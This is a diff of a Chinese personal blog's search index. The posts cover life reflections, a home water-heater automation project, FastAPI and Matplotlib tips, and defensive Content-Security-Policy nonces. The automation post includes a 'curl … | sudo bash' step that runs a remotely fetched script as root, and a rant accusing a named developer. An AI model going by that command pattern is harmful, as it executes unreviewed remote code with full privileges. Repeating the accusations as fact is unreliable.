@@ -1,84 +1,41 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>30-years-old</title>
-    <url>/2020/02/28/30-years-old/</url>
-    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200228/zblPctz24xrE.png?imageslim" alt="mark"></p>
-<p>如果生活是大海，那么其中的每天就像海浪，有的震撼，有的普通。</p>
-<p>每年的反省都会发现很多让自己后悔不已的事情，往事并不如烟。</p>
+    <title>热水器改造项目</title>
+    <url>/2020/01/14/Friendly-Arm/</url>
+    <content><![CDATA[<p>生活上有一个不便之处是关于热水器的使用，说到这里，务必劝解各位，🤐买房一定不要买☠️万科☠️。</p>
 <a id="more"></a>
 
+<p>因为热水器🚿是配套赠送的，暂时没有更换的需求，热水器是力诺瑞特电热和太阳能混合的，保证了天气不好的时候可以使用电加热，但是电加热非常不方便，尤其在这个被物联网时代惯坏了时代。在外没法看到热水器的温度显示。<br>想着实现如下功能：</p>
+<ul>
+<li><input disabled="" type="checkbox"> 远程观看热水器水温</li>
+<li><input disabled="" type="checkbox"> 远程（手机）可点击热水器的加热按钮</li>
+<li><input disabled="" type="checkbox"> 在家时候使用天猫精灵进行开启和关闭加热</li>
+</ul>
 <ol>
-<li><p>相信命</p>
-<p>信命不是极致的悲观、灰暗和迷信，而是理性又成熟深刻的价值观，知道山外有山，才能更加云淡风轻，每个人的起跑线不一样，个体的差异不因意志转移而改变，尊重客观事实才能更好的活自己。</p>
-</li>
-<li><p>信息差</p>
-<p>都说现在互联网时代了，没有什么信息查和信息壁垒，其实信息差永远存在。这一点如果认识的更早一些就好了。天下所有靠培训教育来盈利的都是靠的信息差。</p>
-</li>
-<li><p>不要把所有的鸡蛋都放在一个篮子里</p>
-<p>不要等到拥有几十万再去理财，把收入分成几份，消费，应急，储蓄，年轻的时候不要折腾股票和其他投资，在你认知不能驾驭你所有用的时候，这些拥有都将成为失去，老实把钱存起来，钱多一些，你的自信会更多一些，思维会越来越广。</p>
-</li>
-<li><p>降低自我预期的阈值</p>
-<p>没有人能随便成功，降低预期能让自己好过不少，至少失败的时候能舒服一些，学会接受失败面对现实。</p>
-</li>
-<li><p>家庭合伙制是婚宴的本质</p>
-<p>性格好的女人比漂亮、有才、有钱之类更加优势明显。</p>
-</li>
-<li><p>不要和老板做朋友</p>
-<p>如果和老板称兄道弟，表面越好，后面撕逼就更严重。开始很美丽，结束没道理。</p>
-</li>
-<li><p>少买或者不买付费知识课程</p>
-<p>90%的课程本质上都是垃圾，对你没有任何好处，所有的方法论和成功方式都不适合你，基本连可应用的场景都没有，知识付费本质上是贩卖焦虑，收智商税。省下这些时间读几本经典的书并总结。</p>
-</li>
-<li><p>买保险</p>
-<p>保险是你人生变故后的最后一根救命稻草。</p>
-</li>
-<li><p>学习一项特长</p>
-<p>趁早刻意练习，特长能够让你保持足够的竞争力和优势。</p>
-</li>
-<li><p>及时止损</p>
-<p>错了就是错了，失败了就是失败了，及时抽离。</p>
-</li>
-<li><p>锻炼身体</p>
-<p>这世界是你的，但最终是哪些身体好的。</p>
-</li>
-<li><p>享受孤独，学会独立思考</p>
-<p>孤独并不可耻，每个人都是孤独的，只有自己了解自己。</p>
-</li>
-<li><p>创业</p>
-<p>多去折腾，选择别人而不是被别人选择。</p>
-</li>
-<li><p>自信坚持</p>
-<p>自信能让你获得更多的资源和快感。</p>
+<li><p><strong>硬件准备</strong></p>
+<p>手里有树莓派、esp32、esp8266和好多开发板，综合考虑使用一块友善之臂的开发板，但是友善之臂开发板的固件非常的不友善，看了一下采用了H3的soc，对比了一下国内有好几家有类似的方案，orangePi,BananaPi,发现香蕉派的M2和友善之臂M1 Plus有着惊人的相似之处，连引脚定义都是相同的，但是香蕉派的固件明显的要友善一些，单从固件大小上就能看出，友善之臂没有打包很多的驱动在内。</p>
+<blockquote>
+<p>尝试将BananaPi的固件刷入友善之臂，竟然完美兼容。😂</p>
+</blockquote>
+<p>要实现温度的读取，如果从热水器内部下手，担心丢失保修，只能从外部下手，使用大的摄像头担心浪费，买了一个esp32-cam模块来拍摄温度显示，然后写个图像的ocr识别来曲线救国。</p>
 </li>
 </ol>
-]]></content>
-      <categories>
-        <category>docs</category>
-        <category>python</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>FastApi</title>
-    <url>/2020/01/20/FastApi/</url>
-    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200120/ULXjnIOWfCPh.jpg?imageslim" alt="mark"><br>FastAPI framework, high performance, easy to learn, fast to code, ready for production</p>
-<a id="more"></a>
-
-<p>Documentation: <a class="link"   href="https://fastapi.tiangolo.com"  target="_blank" rel="noopener">https://fastapi.tiangolo.com<i class="fas fa-external-link-alt"></i></a></p>
-<p>如果应对一个非常简单的需求，比如编写一个接口，总不能直接Django，但也不能写的很糙。如果用Flask，虽然可以用很短的代码写出一个能用的项目，但是需要很多地方需要处理。</p>
-<p>如果使用FastApi就会简单很多：</p>
-<figure class="highlight properties"><table><tr><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">from</span> <span class="hljs-string">fastapi import FastAPI</span><br><span class="hljs-attr">from</span> <span class="hljs-string">pydantic import BaseModel</span><br><span class="hljs-attr">app</span> = <span class="hljs-string">FastAPI()</span><br><span class="hljs-attr">class</span> <span class="hljs-string">People(BaseModel):</span><br>    <span class="hljs-attr">name</span>:<span class="hljs-string">str</span><br>    <span class="hljs-attr">age</span>:<span class="hljs-string">int</span><br>    <span class="hljs-attr">address</span>:<span class="hljs-string">str</span><br>    <span class="hljs-attr">salary</span>:<span class="hljs-string">float</span><br><br><span class="hljs-attr">@app.post('/insert')</span><br><span class="hljs-attr">def</span> <span class="hljs-string">insert(people:People):</span><br>    <span class="hljs-attr">age_after_10_years</span> = <span class="hljs-string">people.age + 10</span><br>    <span class="hljs-attr">msg</span> = <span class="hljs-string">"人名：&#123;people.name&#125;,十年后的年龄为：&#123;age_after_10_years&#125;'</span><br>    <span class="hljs-attr">return</span> <span class="hljs-string">&#123;'success:'True,'msg':msg&#125;</span><br></code></pre></td></tr></table></figure>
-<p>启动服务后，如果传入错误的值，返回值将会非常友好的告诉你哪里出错了。对类型的检查全部由FastAPI自己完成，非常pythonic。<br>使用fastAPI 需要使用uvicorn来运行FastAPI</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">pip <span class="hljs-keyword">install</span> uvicorn<br>uvicorn <span class="hljs-keyword">main</span>:app <span class="hljs-comment">--reload</span><br></code></pre></td></tr></table></figure>
-<p>main: 代码文件名 main.py</br><br>app: 初始化FastAPI的对象名</br><br>–reload 代码修改后立即生效，不需要重启</p>
-<h3 id="GET-方法定义"><a href="#GET-方法定义" class="headerlink" title="GET 方法定义"></a>GET 方法定义</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><code class="hljs ruby">@app.get(<span class="hljs-string">'/quert/&#123;uid&#125;'</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span><span class="hljs-params">(uid)</span></span>:<br>    msg = <span class="hljs-string">'您查询的uid为：&#123;uid&#125;'</span><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">'success'</span><span class="hljs-symbol">:True</span>,<span class="hljs-string">'msg'</span><span class="hljs-symbol">:msg</span>&#125;<br></code></pre></td></tr></table></figure>
-<p>直接请求该地址：<br><a class="link"   href="http://127.0.0.1:8000/query/789"  target="_blank" rel="noopener">http://127.0.0.1:8000/query/789<i class="fas fa-external-link-alt"></i></a><br>如果限定uid的类型，只需要在函数定义时候指定类型</p>
-<figure class="highlight ruby"><table><tr><td class="code"><pre><code class="hljs ruby"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">quert</span><span class="hljs-params">(<span class="hljs-symbol">uid:</span>int)</span></span><span class="hljs-symbol">:</span><br></code></pre></td></tr></table></figure>
-<p>除了这些之外，FastAPI还能帮我们快速的生成接口文档。<br><a class="link"   href="http://127.0.0.1:8000/docs"  target="_blank" rel="noopener">http://127.0.0.1:8000/docs<i class="fas fa-external-link-alt"></i></a><br><img src="https://fastapi.tiangolo.com/img/index/index-03-swagger-02.png" alt=""></p>
+<ul>
+<li>加热按钮考虑使用舵机来实现模拟人工的按键</li>
+</ul>
+<ol start="2">
+<li><p>数据中心使用Domoticz</p>
+<p>树莓派安装Domoticz非常方便</p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">sudo curl -L install.domoticz.<span class="hljs-keyword">cn</span> | sudo bash<br>sudo apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span><br></code></pre></td></tr></table></figure>
+<p>运行以上命令后就会进入domoticz的配置界面。</p>
+</li>
+<li><p>流程图</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs sequence">participant 客户端 as A<br>participant esp32CAM as B<br>participant 数据中心 as C<br>Note over A:用户账号、密码<br>A-&gt;C: 访问数据中心<br>Note over C:验证账号、密码<br>C--&gt;&gt;A:热水器温度状态<br>A-&gt;C:发送指令<br>C--&gt;&gt;B:发送指令<br>B-&gt;B:自交互<br></code></pre></td></tr></table></figure>
+<p>未完待续…</p>
+</li>
+</ol>
+<p>尤其是济南华艺黄运林这个老板经营的地产项目，绝对是坑，项目要配套没有配套在济南开发的这些项目都是合作开发，狗血的是作为万科济南负责人竟然自己注册了个华艺地产，万科和华艺合作。</p>
 ]]></content>
       <categories>
         <category>docs</category>
@@ -136,41 +93,84 @@ bootloader 生成后将会出现地址</li>
       </tags>
   </entry>
   <entry>
-    <title>热水器改造项目</title>
-    <url>/2020/01/14/Friendly-Arm/</url>
-    <content><![CDATA[<p>生活上有一个不便之处是关于热水器的使用，说到这里，务必劝解各位，🤐买房一定不要买☠️万科☠️。</p>
+    <title>FastApi</title>
+    <url>/2020/01/20/FastApi/</url>
+    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200120/ULXjnIOWfCPh.jpg?imageslim" alt="mark"><br>FastAPI framework, high performance, easy to learn, fast to code, ready for production</p>
 <a id="more"></a>
 
-<p>因为热水器🚿是配套赠送的，暂时没有更换的需求，热水器是力诺瑞特电热和太阳能混合的，保证了天气不好的时候可以使用电加热，但是电加热非常不方便，尤其在这个被物联网时代惯坏了时代。在外没法看到热水器的温度显示。<br>想着实现如下功能：</p>
-<ul>
-<li><input disabled="" type="checkbox"> 远程观看热水器水温</li>
-<li><input disabled="" type="checkbox"> 远程（手机）可点击热水器的加热按钮</li>
-<li><input disabled="" type="checkbox"> 在家时候使用天猫精灵进行开启和关闭加热</li>
-</ul>
+<p>Documentation: <a class="link"   href="https://fastapi.tiangolo.com"  target="_blank" rel="noopener">https://fastapi.tiangolo.com<i class="fas fa-external-link-alt"></i></a></p>
+<p>如果应对一个非常简单的需求，比如编写一个接口，总不能直接Django，但也不能写的很糙。如果用Flask，虽然可以用很短的代码写出一个能用的项目，但是需要很多地方需要处理。</p>
+<p>如果使用FastApi就会简单很多：</p>
+<figure class="highlight properties"><table><tr><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">from</span> <span class="hljs-string">fastapi import FastAPI</span><br><span class="hljs-attr">from</span> <span class="hljs-string">pydantic import BaseModel</span><br><span class="hljs-attr">app</span> = <span class="hljs-string">FastAPI()</span><br><span class="hljs-attr">class</span> <span class="hljs-string">People(BaseModel):</span><br>    <span class="hljs-attr">name</span>:<span class="hljs-string">str</span><br>    <span class="hljs-attr">age</span>:<span class="hljs-string">int</span><br>    <span class="hljs-attr">address</span>:<span class="hljs-string">str</span><br>    <span class="hljs-attr">salary</span>:<span class="hljs-string">float</span><br><br><span class="hljs-attr">@app.post('/insert')</span><br><span class="hljs-attr">def</span> <span class="hljs-string">insert(people:People):</span><br>    <span class="hljs-attr">age_after_10_years</span> = <span class="hljs-string">people.age + 10</span><br>    <span class="hljs-attr">msg</span> = <span class="hljs-string">"人名：&#123;people.name&#125;,十年后的年龄为：&#123;age_after_10_years&#125;'</span><br>    <span class="hljs-attr">return</span> <span class="hljs-string">&#123;'success:'True,'msg':msg&#125;</span><br></code></pre></td></tr></table></figure>
+<p>启动服务后，如果传入错误的值，返回值将会非常友好的告诉你哪里出错了。对类型的检查全部由FastAPI自己完成，非常pythonic。<br>使用fastAPI 需要使用uvicorn来运行FastAPI</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">pip <span class="hljs-keyword">install</span> uvicorn<br>uvicorn <span class="hljs-keyword">main</span>:app <span class="hljs-comment">--reload</span><br></code></pre></td></tr></table></figure>
+<p>main: 代码文件名 main.py</br><br>app: 初始化FastAPI的对象名</br><br>–reload 代码修改后立即生效，不需要重启</p>
+<h3 id="GET-方法定义"><a href="#GET-方法定义" class="headerlink" title="GET 方法定义"></a>GET 方法定义</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><code class="hljs ruby">@app.get(<span class="hljs-string">'/quert/&#123;uid&#125;'</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span><span class="hljs-params">(uid)</span></span>:<br>    msg = <span class="hljs-string">'您查询的uid为：&#123;uid&#125;'</span><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">'success'</span><span class="hljs-symbol">:True</span>,<span class="hljs-string">'msg'</span><span class="hljs-symbol">:msg</span>&#125;<br></code></pre></td></tr></table></figure>
+<p>直接请求该地址：<br><a class="link"   href="http://127.0.0.1:8000/query/789"  target="_blank" rel="noopener">http://127.0.0.1:8000/query/789<i class="fas fa-external-link-alt"></i></a><br>如果限定uid的类型，只需要在函数定义时候指定类型</p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><code class="hljs ruby"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">quert</span><span class="hljs-params">(<span class="hljs-symbol">uid:</span>int)</span></span><span class="hljs-symbol">:</span><br></code></pre></td></tr></table></figure>
+<p>除了这些之外，FastAPI还能帮我们快速的生成接口文档。<br><a class="link"   href="http://127.0.0.1:8000/docs"  target="_blank" rel="noopener">http://127.0.0.1:8000/docs<i class="fas fa-external-link-alt"></i></a><br><img src="https://fastapi.tiangolo.com/img/index/index-03-swagger-02.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>docs</category>
+        <category>python</category>
+        <category>index</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>30-years-old</title>
+    <url>/2020/02/28/30-years-old/</url>
+    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200228/zblPctz24xrE.png?imageslim" alt="mark"></p>
+<p>如果生活是大海，那么其中的每天就像海浪，有的震撼，有的普通。</p>
+<p>每年的反省都会发现很多让自己后悔不已的事情，往事并不如烟。</p>
+<a id="more"></a>
+
 <ol>
-<li><p><strong>硬件准备</strong></p>
-<p>手里有树莓派、esp32、esp8266和好多开发板，综合考虑使用一块友善之臂的开发板，但是友善之臂开发板的固件非常的不友善，看了一下采用了H3的soc，对比了一下国内有好几家有类似的方案，orangePi,BananaPi,发现香蕉派的M2和友善之臂M1 Plus有着惊人的相似之处，连引脚定义都是相同的，但是香蕉派的固件明显的要友善一些，单从固件大小上就能看出，友善之臂没有打包很多的驱动在内。</p>
-<blockquote>
-<p>尝试将BananaPi的固件刷入友善之臂，竟然完美兼容。😂</p>
-</blockquote>
-<p>要实现温度的读取，如果从热水器内部下手，担心丢失保修，只能从外部下手，使用大的摄像头担心浪费，买了一个esp32-cam模块来拍摄温度显示，然后写个图像的ocr识别来曲线救国。</p>
+<li><p>相信命</p>
+<p>信命不是极致的悲观、灰暗和迷信，而是理性又成熟深刻的价值观，知道山外有山，才能更加云淡风轻，每个人的起跑线不一样，个体的差异不因意志转移而改变，尊重客观事实才能更好的活自己。</p>
+</li>
+<li><p>信息差</p>
+<p>都说现在互联网时代了，没有什么信息查和信息壁垒，其实信息差永远存在。这一点如果认识的更早一些就好了。天下所有靠培训教育来盈利的都是靠的信息差。</p>
+</li>
+<li><p>不要把所有的鸡蛋都放在一个篮子里</p>
+<p>不要等到拥有几十万再去理财，把收入分成几份，消费，应急，储蓄，年轻的时候不要折腾股票和其他投资，在你认知不能驾驭你所有用的时候，这些拥有都将成为失去，老实把钱存起来，钱多一些，你的自信会更多一些，思维会越来越广。</p>
+</li>
+<li><p>降低自我预期的阈值</p>
+<p>没有人能随便成功，降低预期能让自己好过不少，至少失败的时候能舒服一些，学会接受失败面对现实。</p>
+</li>
+<li><p>家庭合伙制是婚宴的本质</p>
+<p>性格好的女人比漂亮、有才、有钱之类更加优势明显。</p>
+</li>
+<li><p>不要和老板做朋友</p>
+<p>如果和老板称兄道弟，表面越好，后面撕逼就更严重。开始很美丽，结束没道理。</p>
+</li>
+<li><p>少买或者不买付费知识课程</p>
+<p>90%的课程本质上都是垃圾，对你没有任何好处，所有的方法论和成功方式都不适合你，基本连可应用的场景都没有，知识付费本质上是贩卖焦虑，收智商税。省下这些时间读几本经典的书并总结。</p>
+</li>
+<li><p>买保险</p>
+<p>保险是你人生变故后的最后一根救命稻草。</p>
+</li>
+<li><p>学习一项特长</p>
+<p>趁早刻意练习，特长能够让你保持足够的竞争力和优势。</p>
+</li>
+<li><p>及时止损</p>
+<p>错了就是错了，失败了就是失败了，及时抽离。</p>
+</li>
+<li><p>锻炼身体</p>
+<p>这世界是你的，但最终是哪些身体好的。</p>
+</li>
+<li><p>享受孤独，学会独立思考</p>
+<p>孤独并不可耻，每个人都是孤独的，只有自己了解自己。</p>
+</li>
+<li><p>创业</p>
+<p>多去折腾，选择别人而不是被别人选择。</p>
+</li>
+<li><p>自信坚持</p>
+<p>自信能让你获得更多的资源和快感。</p>
 </li>
 </ol>
-<ul>
-<li>加热按钮考虑使用舵机来实现模拟人工的按键</li>
-</ul>
-<ol start="2">
-<li><p>数据中心使用Domoticz</p>
-<p>树莓派安装Domoticz非常方便</p>
-<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">sudo curl -L install.domoticz.<span class="hljs-keyword">cn</span> | sudo bash<br>sudo apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span><br></code></pre></td></tr></table></figure>
-<p>运行以上命令后就会进入domoticz的配置界面。</p>
-</li>
-<li><p>流程图</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs sequence">participant 客户端 as A<br>participant esp32CAM as B<br>participant 数据中心 as C<br>Note over A:用户账号、密码<br>A-&gt;C: 访问数据中心<br>Note over C:验证账号、密码<br>C--&gt;&gt;A:热水器温度状态<br>A-&gt;C:发送指令<br>C--&gt;&gt;B:发送指令<br>B-&gt;B:自交互<br></code></pre></td></tr></table></figure>
-<p>未完待续…</p>
-</li>
-</ol>
-<p>尤其是济南华艺黄运林这个老板经营的地产项目，绝对是坑，项目要配套没有配套在济南开发的这些项目都是合作开发，狗血的是作为万科济南负责人竟然自己注册了个华艺地产，万科和华艺合作。</p>
 ]]></content>
       <categories>
         <category>docs</category>
@@ -286,6 +286,90 @@ bootloader 生成后将会出现地址</li>
       </tags>
   </entry>
   <entry>
+    <title>及时行乐</title>
+    <url>/2018/08/03/about/</url>
+    <content><![CDATA[<p>及时行乐（Enjoy Pleasure in Good Time.）<br><img src="https://i.loli.net/2018/08/03/5b63cc6e20cd8.png" alt="epgt"></p>
+<blockquote>
+<p>人生苦短,何不及时行乐</br><br>释义：抓紧时机，不失时机，寻欢作乐。</br></p>
+</blockquote>
+<a id="more"></a>
+<p>出处:《新刊大宋宣和遗事》：“人生如白驹过隙，倘不及时行乐，则老大徒伤悲也。”</br><br>例句：短歌行（曹操）对酒当歌，人生几何？ 譬如朝露，去日苦多。 慨当以慷，忧思难忘。 何以解忧？唯有杜康。</p>
+<p>So, there you have it… enjoy!</p>
+]]></content>
+      <categories>
+        <category>docs</category>
+        <category>index</category>
+      </categories>
+      <tags>
+        <tag>collect</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>awake</title>
+    <url>/2021/05/25/awake/</url>
+    <content><![CDATA[<blockquote>
+<p>he needs to wake up to reality.</p>
+</blockquote>
+<p>上个周六的晚上，孩子跟我们一起睡，一直枕着我的肚子或者腿，晚上一直在做梦，要么是哈哈大笑，要么是再说看的动画片或者白天玩的游戏。</p>
+<p>但是今晚突然哭了起来，说爸爸没有钱，奶奶也没有钱，他们都没有钱给我买好好了，然后边说边嚎啕大哭。</p>
+<p>我想了一下，确实，我想了整整一宿，我想我要记录下我当时的感受，每当懒散不振的时候，自己来看看。</p>
+]]></content>
+      <categories>
+        <category>docs</category>
+        <category>python</category>
+        <category>index</category>
+      </categories>
+      <tags>
+        <tag>Life</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>beautifulsoup-useage</title>
+    <url>/2016/09/08/beautifulsoup-useage/</url>
+    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200229/2P84vXFo0Fzh.png?imageslim" alt="mark"></p>
+<p>之前混合使用bs4、re、lxml 这三个Modules进行解析html的方式虽然可以解决问题但是明显的影响了响应速度，突然发现BS4可以使用CSS Selector方式类似与Xpath的解析。</p>
+<a id="more"></a>
+
+<p><img src="http://imgs.yrzdm.com/imgs/20200229/kNugfSMSXFNJ.png?imageslim" alt="mark"></p>
+<p>通过Chrome或者FF 得到tag的CSS Selector 路径使用select可以直接进行使用，明显的代码少了很多行，而且执行速度大大提升。</p>
+]]></content>
+      <categories>
+        <category>docs</category>
+        <category>python</category>
+        <category>index</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>BeautifulSoup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Matplotlib常见问题</title>
+    <url>/2020/01/10/Matplotlib/</url>
+    <content><![CDATA[<p><a href="https://imgchr.com/i/lfzqat" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/01/10/lfzqat.md.jpg" alt="lfzqat.md.jpg"></a><br>最近接了不少学生作业大多数都是预测和数据分析以及分类器相关，所用图表展示用到Matplotlib，经常会涉及到一些问题，对出现的问题进行整理，避免重复踩坑。</p>
+<a id="more"></a>
+
+<ol>
+<li><strong>中文显示乱码问题</strong><br>图表展示，图例等标识都需要用到中文，如果MATPLOTLIB缺少中文字体的调用，图表显示的时候会出现乱码。</li>
+</ol>
+<figure class="highlight xl"><table><tr><td class="code"><pre><code class="hljs xl"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br>from matplotlib.figure <span class="hljs-keyword">import</span> Figure<br><br># 正常显示画图时出现的中文和负号<br>from pylab <span class="hljs-keyword">import</span> mpl<br>mpl.rcParams[<span class="hljs-string">'font.sans-serif'</span>]=[<span class="hljs-string">'SimHei'</span>]<br>mpl.rcParams[<span class="hljs-string">'axes.unicode_minus'</span>]=False<br></code></pre></td></tr></table></figure>
+<ol start="2">
+<li><strong>tight_layout()</strong><br>Matplotlib v1.1 引入一个新的命令tight_layout(),用来调整子图参数，使之填充图像区域，解决Axes轴标签、标题、刻度超出图形区域的问题。</li>
+</ol>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">def show(self):<br>    self.figure.tight_layout()<br>    FigureCanvasAgg.draw(self)<br>    <span class="hljs-keyword">if</span><span class="hljs-built_in"> PORT </span>is None:<br>        return<br><br>    <span class="hljs-keyword">if</span> matplotlib.__version__ &lt; <span class="hljs-string">'1.2'</span>:<br>        buffer = self.tostring_rgb(0, 0)<br>    <span class="hljs-keyword">else</span>:<br>        buffer = self.tostring_rgb()<br><br>    <span class="hljs-keyword">if</span> len(<span class="hljs-builtin-name">set</span>(buffer)) &lt;= 1:<br>        # <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> plot empty<br>        return<br><br>    render = self.get_renderer()<br>    width = int(render.width)<br><br>    plot_index = index <span class="hljs-keyword">if</span> os.getenv(<span class="hljs-string">"PYCHARM_MATPLOTLIB_INTERACTIVE"</span>, <span class="hljs-literal">False</span>) <span class="hljs-keyword">else</span> -1<br>    try:<br>        sock = socket.socket()<br>        sock.connect((HOST, PORT))<br>        sock.send(struct.pack(<span class="hljs-string">'&gt;i'</span>, width))<br>        sock.send(struct.pack(<span class="hljs-string">'&gt;i'</span>, plot_index))<br>        sock.send(struct.pack(<span class="hljs-string">'&gt;i'</span>, len(buffer)))<br>        sock.send(buffer)<br>    except OSError as _:<br>        # <span class="hljs-literal">nothing</span> bad. It just means, that our<span class="hljs-built_in"> tool </span>window doesn<span class="hljs-string">'t run yet<br>        pass</span><br></code></pre></td></tr></table></figure>
+<p>当axes列表为空的时候,tight_layout()将会报错，此时需要将plt.show()替换为plt.savefig(‘file.png’,bbox_inches=’tight’)</p>
+]]></content>
+      <categories>
+        <category>docs</category>
+        <category>python</category>
+        <category>index</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>MatPlotlib</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>LineageOS 16.0 (Android 9) for Raspberry Pi 3</title>
     <url>/2020/04/17/android-for-raspberry/</url>
     <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200421/vFL0yUXfrnzq.png?imageslim" alt="mark"><br>最近有个需求是需要一个安卓设备，最好是android7 以上系统，总不能豪横的买一个，手里有个Raspberry3B+🚫🍓</br><br>百度了一下，有几个分享的都是使用Android Things来移植的，Google了一下发现了一个LineageOS 和 emteria.OS可以再3上面运行，那我的3B+肯定也能跑。</p>
@@ -339,26 +423,6 @@ bootloader 生成后将会出现地址</li>
       </tags>
   </entry>
   <entry>
-    <title>beautifulsoup-useage</title>
-    <url>/2016/09/08/beautifulsoup-useage/</url>
-    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200229/2P84vXFo0Fzh.png?imageslim" alt="mark"></p>
-<p>之前混合使用bs4、re、lxml 这三个Modules进行解析html的方式虽然可以解决问题但是明显的影响了响应速度，突然发现BS4可以使用CSS Selector方式类似与Xpath的解析。</p>
-<a id="more"></a>
-
-<p><img src="http://imgs.yrzdm.com/imgs/20200229/kNugfSMSXFNJ.png?imageslim" alt="mark"></p>
-<p>通过Chrome或者FF 得到tag的CSS Selector 路径使用select可以直接进行使用，明显的代码少了很多行，而且执行速度大大提升。</p>
-]]></content>
-      <categories>
-        <category>docs</category>
-        <category>python</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-        <tag>BeautifulSoup</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>bigbang</title>
     <url>/2016/10/26/bigbang/</url>
     <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200229/e1LUuD5jbrUO.png?imageslim" alt="mark"></p>
@@ -384,6 +448,158 @@ bootloader 生成后将会出现地址</li>
       <tags>
         <tag>Python</tag>
         <tag>Jieba</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>csp-nonce 守护inline Script</title>
+    <url>/2020/10/26/csp-nonce/</url>
+    <content><![CDATA[<p>在<a href="https://cx4.github.io/2020/10/22/csp-xss/">XSS终结者</a>一文中，讲述了CSP基础语法组成与使用方式。最终我们利用CSP提供的域名白名单机制，有效地将异常的外联脚本拦在门外。然而在线上环境千千万万，虽然我们限制了外联脚本，但是内联脚本却钻了空。</p>
+<a id="more"></a>
+<h3 id="CSP-unsafe-inline"><a href="#CSP-unsafe-inline" class="headerlink" title="CSP unsafe-inline"></a>CSP unsafe-inline</h3><p>CSP的默认策略是不允许inline脚本执行，所以当我们没有必要进行脚本inline时，CSP域名白名单的机制足以防范注入脚本的问题。然而在实际项目中，我们还是会因为一些场景需要将部分脚本进行inline。于是需要在CSP的规则中增加<code>script-src‘unsafe-inline’</code>配置允许inline资源执行。但也带来了新的隐患。</p>
+<p>允许inline资源执行，也意味着当恶意代码通过inline的方式注入到页面中执行时，页面将变得不再安全。如富文本中被插入一段script代码（没被转义），或者是通过浏览器插件的方式进行代码注入等方式。</p>
+<p><code>Content-Security-Policy： script-src &#39;unsafe-inline&#39;</code></p>
+<h3 id="CSP-nonce"><a href="#CSP-nonce" class="headerlink" title="CSP nonce"></a>CSP nonce</h3><p>为了避免上述问题，我们可以使用<code>nonce</code>方式加强的CSP策略，nonce方式是至每次页面访问都产生一个唯一id，通过给内联脚本增加一个nonce属性，并且使其属性值（id）与返回的CSP nonce-{id}对应。只有当两者一致时，对应的内敛脚本才被允许执行。于是，即使网页被注入异常的脚本，因为攻击者不知道当时的nonce的随机id值，所以注入的脚本不会被执行。从而让网页变得更加安全。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">Content-Security-Policy:script-src 'nonce-5fAiFfSghuhdf'<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">nonce</span>=<span class="hljs-string">"5fAiFfSghuhdf"</span>&gt;</span><span class="actionscript"><br>    <span class="hljs-comment">//.....</span><br></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>那么，当我们通过动态生成脚本并进行插入时，nonce也会将我们正常的代码拦截在外。所以在这种场景下，我们需要配套使用CSP提供的<code>strict-dynamic</code>,<code>strict-dynamic</code>模式允许让被信任的脚本插入并放行正常的脚本执行。</p>
+<p><code>Content-Security-Policy:script-src &#39;nonce-5fAiFfSghuhdf&#39; &#39;strict-dynamic&#39;</code></p>
